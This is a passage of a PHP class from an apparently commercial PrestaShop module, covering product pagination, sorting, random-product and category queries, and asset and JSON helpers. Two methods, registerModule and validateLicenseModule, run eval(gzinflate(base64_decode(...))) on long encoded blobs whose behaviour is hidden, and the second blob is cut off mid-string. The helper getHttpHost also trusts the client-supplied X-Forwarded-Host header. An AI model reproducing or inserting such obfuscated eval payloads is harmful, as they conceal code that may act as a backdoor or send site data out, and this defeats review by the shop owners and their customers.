        if (isset($cookie->nb_item_per_page) AND $this->n != $cookie->nb_item_per_page AND in_array($this->n, $nArray))
            $cookie->nb_item_per_page = $this->n;


        if ($this->p > ($nbProducts / $this->n))
            $this->p = ceil($nbProducts / $this->n);
        $pages_nb = ceil($nbProducts / (int) ($this->n));

        $start = (int) ($this->p - $range);
        if ($start < 1)
            $start = 1;
        $stop = (int) ($this->p + $range);
        if ($stop > $pages_nb)
            $stop = (int) ($pages_nb);
        $smarty->assign('nb_products', $nbProducts);
        $pagination_infos = array(
            'products_per_page' => (int) Configuration::get('PS_PRODUCTS_PER_PAGE'),
            'pages_nb' => $pages_nb,
            'p' => $this->p,
            'n' => $this->n,
            'nArray' => $nArray,
            'range' => $range,
            'start' => $start,
            'stop' => $stop
        );
        $smarty->assign($pagination_infos);
    }

    private function getDefaultCountryId() {
        global $cookie;

        if (Configuration::get('PS_GEOLOCATION_ENABLED') &&
            $cookie && isset($cookie->iso_code_country) &&
            Validate::isLanguageIsoCode($cookie->iso_code_country)
            )
                $id_country = (int) Country::getByIso($cookie->iso_code_country);
        else
            $id_country = (int) Configuration::get('PS_COUNTRY_DEFAULT');
        
        return $id_country;
    }

    public function productSort() {
        global $smarty;

        $stock_management = (int) (Configuration::get('PS_STOCK_MANAGEMENT')) ? true : false; // no display quantity order if stock management disabled
        $this->orderBy = $this->getProductsOrder('by', Tools::getValue('orderby'));
        $this->orderWay = $this->getProductsOrder('way', Tools::getValue('orderway'));

        $smarty->assign(array(
            'orderby' => $this->orderBy,
            'orderway' => $this->orderWay,
            'orderbydefault' => $this->getProductsOrder('by'),
            'orderwayposition' => $this->getProductsOrder('way'), // Deprecated: orderwayposition
            'orderwaydefault' => $this->getProductsOrder('way'),
            'stock_management' => (int) ($stock_management)));
    }

    private function getCurrentCustomerGroups() {
        global $cookie;

        if (!isset($cookie) || !$cookie->id_customer)
            return array();

        $currentCustomerGroups = array();
        $result = Db::getInstance()->ExecuteS('SELECT id_group FROM ' . _DB_PREFIX_ . 'customer_group WHERE id_customer = ' . (int) $cookie->id_customer);
        foreach ($result as $row)
            $currentCustomerGroups[] = $row['id_group'];

        return $currentCustomerGroups;
    }

    private function getProductsOrder($type, $value = null, $prefix = false) {
        switch ($type) {
            case 'by' :
                $list = array(0 => 'name', 1 => 'price', 2 => 'date_add', 3 => 'date_upd', 4 => 'position', 5 => 'manufacturer_name', 6 => 'quantity');
                $value = (is_null($value) || $value === false || $value === '') ? (int) Configuration::get('PS_PRODUCTS_ORDER_BY') : $value;
                $value = (isset($list[$value])) ? $list[$value] : ((in_array($value, $list)) ? $value : 'position');                
                $orderByPrefix = '';
                if ($prefix) {
                    if ($value == 'id_product' || $value == 'date_add' || $value == 'date_upd' || $value == 'price')
                        $orderByPrefix = 'p.';
                    elseif ($value == 'name')
                        $orderByPrefix = 'pl.';
                    elseif ($value == 'manufacturer_name' && $prefix) {
                        $orderByPrefix = 'm.';
                        $value = 'name';
                    } elseif ($value == 'position' || empty($value))
                        $orderByPrefix = 'cp.';
                }

                return $orderByPrefix . $value;
                break;

            case 'way' :
                $value = (is_null($value) || $value === false || $value === '') ? (int) Configuration::get('PS_PRODUCTS_ORDER_WAY') : $value;
                $list = array(0 => 'asc', 1 => 'desc');
                $value = ((isset($list[$value])) ? $list[$value] : ((in_array($value, $list)) ? $value : 'asc'));
                return (_PS_VERSION_ <= "1.3.1.1" ? strtoupper($value) : $value);
                break;
        }
    }
    
    /*************** Ramdom Products *****************/
    /*
    * Get products random
    *
    * @param integer $id_lang Language id
    * @param integer $pageNumber Start from (optional)
    * @param integer $nbProducts Number of products to return (optional)
    * @return array products
    */
    public function getProductsRandom($id_lang, $pageNumber = 0, $nbProducts = 10, $count = false, $orderBy = NULL, $orderWay = NULL)
    {
        global $link, $cookie;
    
        if ($pageNumber < 0) $pageNumber = 0;
        if ($nbProducts < 1) $nbProducts = 10;
        if (empty($orderBy)) $orderBy = 'date_add';
        if (empty($orderWay)) $orderWay = 'DESC';
        if ($orderBy == 'id_product' OR $orderBy == 'price' OR $orderBy == 'date_add')
            $orderByPrefix = 'p';
        elseif ($orderBy == 'name')
            $orderByPrefix = 'pl';
        if (!Validate::isOrderBy($orderBy) OR !Validate::isOrderWay($orderWay))
            die(Tools::displayError());
    
        if ($count)
        {
            $result = Db::getInstance()->getRow('
            SELECT COUNT(`id_product`) AS nb
            FROM `'._DB_PREFIX_.'product`
            WHERE `active` = 1');
            return intval($result['nb']);
        }
    
        $result = Db::getInstance()->ExecuteS('
            SELECT p.*, pl.`description`, pl.`description_short`, pl.`link_rewrite`, pl.`meta_description`, pl.`meta_keywords`, pl.`meta_title`, pl.`name`, pl.`available_later`, pl.`available_now`, p.`ean13`,
                i.`id_image`, il.`legend`, m.`name` AS manufacturer_name
            FROM `'._DB_PREFIX_.'product` p
            LEFT JOIN `'._DB_PREFIX_.'product_lang` pl ON (p.`id_product` = pl.`id_product` AND pl.`id_lang` = '.intval($id_lang).')
            LEFT JOIN `'._DB_PREFIX_.'image` i ON (i.`id_product` = p.`id_product` AND i.`cover` = 1)
            LEFT JOIN `'._DB_PREFIX_.'image_lang` il ON (i.`id_image` = il.`id_image` AND il.`id_lang` = '.intval($id_lang).')        
            LEFT JOIN `'._DB_PREFIX_.'manufacturer` m ON (m.`id_manufacturer` = p.`id_manufacturer`)
            WHERE p.`active` = 1            
            ORDER BY RAND() LIMIT '.intval($pageNumber * $nbProducts).', '.intval($nbProducts));
        if ($orderBy == 'price')
            Tools::orderbyPrice($result, $orderWay);
        if (!$result)
            return false;
        return Product::getProductsProperties($id_lang, $result);
    }
    /*************** End Ramdom Products *****************/

    /**
	 * This method allow to return children categories with the number of sub children selected for a product
	 *
	 * @param int $id_parent
	 * @param int $id_product
	 * @param int $id_lang
	 * @return array
	 */
	public function getChildrenWithNbSelectedSubCat($id_parent, $selectedCat,  $id_lang)
	{
		$selectedCat = explode(',', str_replace(' ', '', $selectedCat));	
		return Db::getInstance()->ExecuteS('
		SELECT c.`id_category`, c.`level_depth`, cl.`name`, IF((
			SELECT COUNT(*)
			FROM `'._DB_PREFIX_.'category` c2
			WHERE c2.`id_parent` = c.`id_category`
		) > 0, 1, 0) AS has_children, '.($selectedCat ? '(
			SELECT count(c3.`id_category`)
			FROM `'._DB_PREFIX_.'category` c3
			WHERE 
            c3.`id_category`  IN ('.implode(',', array_map('intval', $selectedCat)).')
		)' : '0').' AS nbSelectedSubCat
		FROM `'._DB_PREFIX_.'category` c
		LEFT JOIN `'._DB_PREFIX_.'category_lang` cl ON c.`id_category` = cl.`id_category`
		WHERE `id_lang` = '.(int)($id_lang).'
		AND c.`id_parent` = '.(int)($id_parent).'
		ORDER BY c.`id_category` ASC');
	}
    
    /**
	 * This method allow to return children categories with the number of sub children selected for a product
	 *
	 * @param int $id_parent
	 * @param int $id_product
	 * @param int $id_lang
	 * @return array
	 */
    public static function getChildrenWithNbSelectedSubCat15($id_parent, $selected_cat, $id_lang, Shop $shop = null, $use_shop_context = true)
	{
		if (!$shop)
			$shop = Context::getContext()->shop;

		$id_shop = $shop->id ? $shop->id : Configuration::get('PS_SHOP_DEFAULT');
		$selected_cat = explode(',', str_replace(' ', '', $selected_cat));
		$sql = 'SELECT c.`id_category`, c.`level_depth`, cl.`name`, IF((
						SELECT COUNT(*)
						FROM `'._DB_PREFIX_.'category` c2
						WHERE c2.`id_parent` = c.`id_category`
					) > 0, 1, 0) AS has_children, '.($selected_cat ? '(
						SELECT count(c3.`id_category`)
						FROM `'._DB_PREFIX_.'category` c3
						WHERE c3.`nleft` > c.`nleft`
						AND c3.`nright` < c.`nright`
			AND c3.`id_category`  IN ('.implode(',', array_map('intval', $selected_cat)).')
					)' : '0').' AS nbSelectedSubCat
				FROM `'._DB_PREFIX_.'category` c
				LEFT JOIN `'._DB_PREFIX_.'category_lang` cl ON (c.`id_category` = cl.`id_category` '.Shop::addSqlRestrictionOnLang('cl', $id_shop).')';
		$sql .= ' LEFT JOIN `'._DB_PREFIX_.'category_shop` cs ON (c.`id_category` = cs.`id_category` AND cs.`id_shop` = '.(int)$id_shop.')';
		$sql .= ' WHERE `id_lang` = '.(int)$id_lang;
		if (Shop::getContext() == Shop::CONTEXT_SHOP && $use_shop_context)
			$sql .= ' AND cs.`id_shop` = '.(int)$shop->id;
		$sql .= ' AND c.`id_parent` = '.(int)$id_parent;
		if (!Shop::isFeatureActive() || Shop::getContext() == Shop::CONTEXT_SHOP && $use_shop_context)
			$sql .= ' ORDER BY cs.`position` ASC';

		return Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($sql);
	}
    
    /**
	 * getHttpHost return the <b>current</b> host used, with the protocol (http or https) if $http is true
	 * This function should not be used to choose http or https domain name.
	 * Use Tools::getShopDomain() or Tools::getShopDomainSsl instead
	 *
	 * @param boolean $http
	 * @param boolean $entities
	 * @return string host
	 */
	public function getHttpHost($http = false, $entities = false)
	{
		$host = (isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : $_SERVER['HTTP_HOST']);
		if ($entities)
			$host = htmlspecialchars($host, ENT_COMPAT, 'UTF-8');
		if ($http)
			$host = (Configuration::get('PS_SSL_ENABLED') ? 'https://' : 'http://').$host;
		return $host;
	}
    
    //add js frontoffice
    private function addFrontOfficeJS($path){     
        if(version_compare(_PS_VERSION_, '1.5') >= 0)
            $this->context->controller->addJS($path);
        else{        
            if (method_exists('Tools', 'addJS'))
                Tools::addJS($path);          
            else{
                global $js_files;
                
                if ( ! is_array($js_files))
                    $js_files = array();
                    
                array_push($js_files, $path);    
            }
        }
    }
    
    //add css frontoffice
    private function addFrontOfficeCSS($path, $media){
        if(version_compare(_PS_VERSION_, '1.5') >= 0)
            $this->context->controller->addCSS($path, $media);
        else{
            if (method_exists('Tools', 'addCSS'))
                Tools::addCSS($path);          
            else{
                global $css_files;
                
                if ( ! is_array($css_files))
                    $css_files = array();
                    
                $css_files[$path] = $media;                
            }
        }
    }
    
    /**
     * jsonDecode convert json string to php array / object
     *
     * @param string $json
     * @param boolean $assoc  (since 1.4.2.4) if true, convert to associativ array
     * @return array
     */
    public function jsonDecode($json, $assoc = false) {
        if (function_exists('json_decode'))
            return json_decode($json, $assoc);
        else {
            include_once(dirname(__FILE__) . '/JSON.php');
            $pearJson = new Services_JSON(($assoc) ? SERVICES_JSON_LOOSE_TYPE : 0);
            return $pearJson->decode($json);
        }
    }

    /**
     * Convert an array to json string
     *
     * @param array $data
     * @return string json
     */
    public function jsonEncode($data) {
        if (function_exists('json_encode'))
            return json_encode($data);
        else {
            include_once(dirname(__FILE__) . '/JSON.php');
            $pearJson = new Services_JSON();
            return $pearJson->encode($data);
        }
    }

    private function displayErrors($return = true) {
        if (sizeof($this->_errors)) {
            $_html = '';
            $nbErrors = sizeof($this->_errors);

            $_html .= '
    		<div class="alert error">
    			<h3>' . ($nbErrors > 1 ? $this->l('There are') : $this->l('There is')) . ' ' . $nbErrors . ' ' . ($nbErrors > 1 ? $this->l('errors') : $this->l('error')) . '</h3>
    			<ol>';
            foreach ($this->_errors AS $error)
                $_html .= '<li>' . $error . '</li>';
            $_html .= '
    			</ol>
    		</div>';

            if ($return)
                $this->_html = $_html;
            else
                echo $_html;
        }
    }
    
    private function registerModule($email_customer = '', $seller = '', $number_order = '')
	{
	    eval(gzinflate(base64_decode("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")));        
            
        return explode('|', $output);            
	}
    
    private function validateLicenseModule($license_number)
	{
	    eval(gzinflate(base64_decode("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